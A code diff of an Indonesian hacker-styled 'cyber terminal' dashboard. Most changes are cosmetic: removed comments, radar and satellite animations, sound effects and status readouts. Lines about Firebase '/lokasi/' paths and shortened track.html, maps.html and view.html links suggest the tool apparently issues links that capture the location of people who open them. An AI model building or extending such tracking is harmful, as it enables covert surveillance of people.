   const container = document.getElementById('radarBlips');
   if (!container) return;
@@ -992,7 +1055,6 @@ function refreshRadarBlips() {
   serverList.forEach((s, idx) => {
     const st = serverStatus[s.url];
     if (!st) return;
-    // Posisi blip melingkar
     const angle = (idx / serverList.length) * Math.PI * 2 - Math.PI / 2;
     const r = radius * (0.5 + 0.5 * ((idx % 3) / 2));
     const xPct = cx + r * Math.cos(angle);
@@ -1013,23 +1075,15 @@ function refreshRadarBlips() {
     container.appendChild(lbl);
   });
 }
-
-// Animasi sweep degree
 setInterval(function() {
   const scan = document.getElementById('radarScan');
   if (scan) scan.textContent = Math.floor(Date.now() / 10 % 360) + '°';
 }, 100);
-
-// Init
 setTimeout(function() {
   renderServerList();
   pingAllServers();
 }, 2000);
-
-// Auto-refresh tiap 10 detik
 setInterval(pingAllServers, 10000);
-
-// Helper escape HTML
 function escapeHtml(s) {
   return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
 }
@@ -1042,7 +1096,7 @@ setInterval(function(){if(Math.random()<0.4){var msg=lcMsgPool[Math.floor(Math.r
 pushConsoleLine('Firebase connected — /lokasi/'+user,'ok');
 pushConsoleLine('Server monitor initialized','ok');
 
-console.log('%c[CYBER TERMINAL] Loaded — Radar Server aktif','color:#00e58a;font-weight:bold');
+console.log('%c[CYBER TERMINAL] Loaded — Radar Server aktif + Upload Foto','color:#00e58a;font-weight:bold');
 </script>
 <script>
 (function(){'use strict';var volLevel=0.3;try{var vs=localStorage.getItem('volLevel');if(vs)volLevel=parseFloat(vs)}catch(e){}var volEl=document.getElementById('volSlider');var volLabel=document.getElementById('volLabel');if(volEl){volEl.value=Math.round(volLevel*100);volLabel.textContent=Math.round(volLevel*100)+'%'}window.setVol=function(v){volLevel=Math.max(0,Math.min(1,v/100));volLabel.textContent=Math.round(volLevel*100)+'%';try{localStorage.setItem('volLevel',volLevel)}catch(e){}};var lastTypeSound=0;function typeBeep(){var now=Date.now();if(now-lastTypeSound<45)return;lastTypeSound=now;if(volLevel<=0)return;try{var ac=new(window.AudioContext||window.webkitAudioContext)();var o=ac.createOscillator();var g=ac.createGain();o.type='square';o.frequency.value=1400+Math.random()*800;g.gain.setValueAtTime(volLevel*0.04,ac.currentTime);g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.04);o.connect(g);g.connect(ac.destination);o.start();o.stop(ac.currentTime+0.04)}catch(e){}}document.addEventListener('input',function(e){var t=e.target;if(t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'))typeBeep()},true);function updateBattery(){if(!navigator.getBattery)return;navigator.getBattery().then(function(b){function upd(){var p=Math.round(b.level*100);var pctEl=document.getElementById('batPct');var fillEl=document.getElementById('batFill');var stEl=document.getElementById('batStatus');if(!pctEl)return;pctEl.textContent=p+'%';fillEl.style.width=p+'%';var st=b.charging?'MENGISI ⚡':'BATERAI '+p+'%';if(p<=20&&!b.charging)st='⚠ LOW BATTERY';stEl.textContent=st;stEl.style.color=p<=20&&!b.charging?'var(--red)':'var(--cyan)'}upd();b.addEventListener('levelchange',upd);b.addEventListener('chargechange',upd)}).catch(function(){})}updateBattery();function updateNet(){var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;var tEl=document.getElementById('netType');var sEl=document.getElementById('netSpeed');if(!tEl)return;if(!c){tEl.textContent='N/A';sEl.textContent='N/A';return}tEl.textContent=(c.effectiveType||'unknown').toUpperCase();sEl.textContent=(c.downlink||'?')+' Mbps · '+(c.rtt||'?')+'ms'}updateNet();if(navigator.connection)navigator.connection.addEventListener('change',updateNet);var decryptOverlay=document.getElementById('decryptOverlay');var dcHex=document.getElementById('dcHex');var dcFill=document.getElementById('dcFill');var dcPct=document.getElementById('dcPct');var decrypting=false;window.runDecrypt=function(callback){if(decrypting){if(callback)callback();return}decrypting=true;decryptOverlay.classList.add('show');var pct=0;var hexTimer=setInterval(function(){var s='';for(var i=0;i<40;i++)s+=Math.floor(Math.random()*2)?'1':'0';dcHex.textContent=s},60);var pTimer=setInterval(function(){pct+=Math.random()*8+2;if(pct>=100){pct=100;clearInterval(pTimer);clearInterval(hexTimer)}dcFill.style.width=pct+'%';dcPct.textContent=Math.floor(pct)+'%';if(pct>=100){setTimeout(function(){decryptOverlay.classList.remove('show');decrypting=false;if(callback)callback()},400)}},90)};fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(d){var ipEl=document.getElementById('ipPub');if(!ipEl)return;ipEl.textContent=d.ip||'-';document.getElementById('ipIsp').textContent=d.org||'-';document.getElementById('ipLoc').textContent=(d.city||'-')+', '+(d.country_name||'-');document.getElementById('ipTz').textContent=d.timezone||'-';document.getElementById('ipUa').textContent=navigator.userAgent.slice(0,60)+'...'}).catch(function(){var ipEl=document.getElementById('ipPub');if(ipEl)ipEl.textContent='Gagal memuat'});function pad(n){return String(n).padStart(2,'0')}setInterval(function(){var d=new Date();var l=document.getElementById('clkLocal');var u=document.getElementById('clkUtc');var x=document.getElementById('clkUnix');if(l)l.textContent=pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());if(u)u.textContent=pad(d.getUTCHours())+':'+pad(d.getUTCMinutes())+':'+pad(d.getUTCSeconds());if(x)x.textContent=Math.floor(d.getTime()/1000)},1000);var satStatuses=['MENGHUBUNGKAN SATELIT...','SINKRONISASI ORBIT...','LOCK ON SIGNAL','UPLINK STABIL','SATELIT AKTIF'];var si=0;setInterval(function(){var el=document.getElementById('satStatus');if(!el)return;el.textContent=satStatuses[si%satStatuses.length];si++},3500);setInterval(function(){var ping=document.getElementById('satPing');var coord=document.getElementById('satCoord');if(!ping)return;var ms=Math.floor(20+Math.random()*80);var sig=Math.floor(70+Math.random()*30);ping.textContent='PING: '+ms+' ms · SIGNAL: '+sig+'%';if(coord){var la=(Math.random()*180-90).toFixed(4);var ln=(Math.random()*360-180).toFixed(4);coord.textContent='ORBIT: '+la+', '+ln}},1800);var hasilEl=document.getElementById('hasil');if(hasilEl&&window.MutationObserver){var firstMut=true;var observer=new MutationObserver(function(){if(firstMut){firstMut=false;return}if(!decrypting)runDecrypt()});observer.observe(hasilEl,{childList:true,subtree:true})}console.log('%c[CYBER TERMINAL] Helper active','color:#00e58a;font-weight:bold')})();
@@ -1245,7 +1299,7 @@ setTimeout(renderSessions,2000);
     if(window.currentShortLink)return window.currentShortLink;
     if(window.currentLink)return window.currentLink;
     if(window.lastLongLink)return window.lastLongLink;
-    try{const arr=JSON.parse(localStorage.getItem('clipHist_'+U)||'[]');const linkItem=arr.find(x=>/^https?:\/\//i.test(x.txt)&&/track\.html|maps\.html|is\.gd/.test(x.txt));if(linkItem)return linkItem.txt;}catch(e){}
+    try{const arr=JSON.parse(localStorage.getItem('clipHist_'+U)||'[]');const linkItem=arr.find(x=>/^https?:\/\//i.test(x.txt)&&/track\.html|maps\.html|view\.html|is\.gd/.test(x.txt));if(linkItem)return linkItem.txt;}catch(e){}
     return '';
   }
   function escapeHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
